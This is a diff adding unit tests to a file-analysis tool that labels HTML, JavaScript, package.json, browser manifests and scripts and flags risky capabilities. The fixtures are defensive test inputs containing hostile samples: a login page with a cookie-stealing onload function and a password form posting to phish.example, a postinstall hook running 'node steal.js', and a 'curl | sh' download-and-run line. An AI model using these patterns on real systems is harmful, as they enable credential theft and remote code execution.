@@ -466,3 +466,84 @@ class TestCLI(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class TestTextAndWebFiles(unittest.TestCase):
+    """0.4.1: HTML / JS / JSON / scripts are read as text, not 'unknown data'."""
+
+    HTML = b"""<!doctype html><html><head><title>Login</title>
+<script src="https://cdn.evil.example/track.js"></script>
+<script type="application/json" id="cfg">{"a": 1}</script>
+<script>
+function render(msg){ document.getElementById('o').innerHTML = msg; log(msg); }
+function log(x){ fetch('https://api.example.com/log', {method:'POST', body: x}); }
+const steal = () => { render(document.cookie); eval('1+1'); };
+</script></head><body onload="steal()">
+<form action="https://phish.example/collect" method="post">
+<input name="u"><input type="password" name="p"></form>
+<iframe src="https://ads.example/frame"></iframe></body></html>"""
+
+    def test_html_page(self):
+        i = _analyze_bytes(self.HTML, "login.html")
+        self.assertEqual(i["format"], "HTML document")
+        self.assertEqual(i["extra"]["title"], "Login")
+        names = [s["name"] for s in i["sections"]]
+        self.assertTrue(any(n.startswith("script src=https://cdn.evil.example") for n in names))
+        self.assertTrue(any(n.startswith("data block #2 (application/json") for n in names))
+        self.assertIn("render", i["disasm"]["steal"]["calls"])
+        self.assertIn("log", i["disasm"]["render"]["calls"])
+        caps = {c["name"]: c["severity"] for c in i["capabilities"]}
+        self.assertEqual(caps["password form posting to phish.example"], "high")
+        for needle in ("runs dynamic code", "HTML injection sinks", "reads or writes cookies",
+                       "network requests", "embeds other pages", "inline event handlers"):
+            self.assertTrue(any(k.startswith(needle) for k in caps), needle)
+        self.assertIn("cdn.evil.example", i["extra"]["external_domains"])
+        sg = _info_to_graph(i)
+        self.assertIn(("fn:steal", "fn:render", "calls"), sg.edges())
+        md = ai_pack_markdown(i)
+        self.assertIn("## Source excerpts", md)
+        self.assertIn("```html", md)
+        self.assertNotIn("Walk through `main`", md)          # web-page questions instead
+
+    def test_javascript_file(self):
+        js = (b"import x from './util.js';\nconst fs = require('child_process');\n"
+              b"export async function main(){ await helper(); }\n"
+              b"async function helper(){ return fetch('/api'); }\n"
+              b"class Widget {}\n")
+        i = _analyze_bytes(js, "app.js")
+        self.assertEqual(i["format"], "JavaScript")
+        self.assertIn("./util.js", i["libraries"])
+        self.assertIn("child_process", i["libraries"])
+        self.assertIn("helper", i["disasm"]["main"]["calls"])
+        self.assertIn("Widget", i["extra"]["classes"])
+        caps = {c["name"] for c in i["capabilities"]}
+        self.assertIn("runs other programs", caps)
+
+    def test_package_json(self):
+        pj = json.dumps({"name": "x", "scripts": {"postinstall": "node steal.js"},
+                         "dependencies": {"left-pad": "^1.0.0"}}).encode()
+        i = _analyze_bytes(pj, "package.json")
+        self.assertEqual(i["format"], "npm package.json")
+        self.assertIn("left-pad@^1.0.0", i["libraries"])
+        self.assertIn("runs code at npm install time", {c["name"] for c in i["capabilities"]})
+        self.assertIn("install scripts", ai_pack_markdown(i))
+
+    def test_extension_manifest(self):
+        mf = json.dumps({"manifest_version": 3, "name": "x",
+                         "permissions": ["cookies", "storage"],
+                         "host_permissions": ["<all_urls>"]}).encode()
+        i = _analyze_bytes(mf, "manifest.json")
+        self.assertIn("Browser extension manifest", i["format"])
+        cap = [c for c in i["capabilities"] if c["name"] == "powerful extension permissions"][0]
+        self.assertEqual(cap["severity"], "high")
+
+    def test_plain_text_and_shebang(self):
+        i = _analyze_bytes(b"#!/bin/sh\ncurl -s http://x.example/a | sh\n", "run")
+        self.assertTrue(i["format"].startswith("Script"))
+        self.assertIn("downloads from the internet", {c["name"] for c in i["capabilities"]})
+        i = _analyze_bytes("namaste duniya\n".encode() * 3, "notes.txt")
+        self.assertEqual(i["format"], "Text")
+        self.assertIn("Content preview", ai_pack_markdown(i))
+
+    def test_binary_is_not_mistaken_for_text(self):
+        self.assertEqual(_analyze_bytes(os.urandom(2048), "x.bin")["format"], "data")
